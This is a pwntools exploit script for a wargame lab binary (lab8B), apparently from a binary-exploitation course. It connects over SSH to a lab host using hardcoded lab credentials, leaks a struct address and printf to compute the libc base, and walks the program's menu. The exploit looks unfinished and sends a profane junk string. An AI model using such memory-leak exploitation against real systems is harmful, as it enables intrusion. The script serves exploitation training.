#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 172.17.18.73 --user lab8B --pass '3v3ryth1ng_Is_@_F1l3' --path /levels/lab08/lab8B
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab8B')
context.terminal = '/bin/bash'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '172.17.18.73'
port = int(args.PORT or 22)
user = args.USER or 'lab8B'
password = args.PASSWORD or '3v3ryth1ng_Is_@_F1l3'
remote_path = '/levels/lab08/lab8B'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=["dookdook"], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

PRINTF       = 0x50b60
GETS         = 0x66ae0
SYSTEM       = 0x3cd10

faves_struct = None
libc_base    = None

io = start()

p = log.progress("Leaking &faves and &printf...")
io.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND:", "4")
io.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND:", "5")

io.recvuntil("Address:")
faves_struct = int(io.readline().strip(), 16)
io.recvuntil("void printFunc:")
libc_base = int(io.readline().strip(), 16) - PRINTF

p.success("done")

log.info("faves: %x" % faves_struct)
log.info("printf: %x\tlibc: %x" % (libc_base + PRINTF, libc_base))

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND:", "1")
io.sendlineafter("Which vector?", "1")


io.sendlineafter("char a:", "1")
io.sendlineafter("short b:" ,"1")
io.sendlineafter("unsigned short c:" , "1")
io.sendlineafter("int d:" , "1")
io.sendlineafter("unsigned int e:" , "1")
io.sendlineafter("long f:" , "1")
io.sendlineafter("unsigned long g:" , "1")
io.sendlineafter("long long h:" , "1")
io.sendlineafter("unsigned long long i:", "1")

io.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND:", "3")
io.sendafter("Which vector?", "1")

io.sendline("FUCKYOU")

io.interactive()

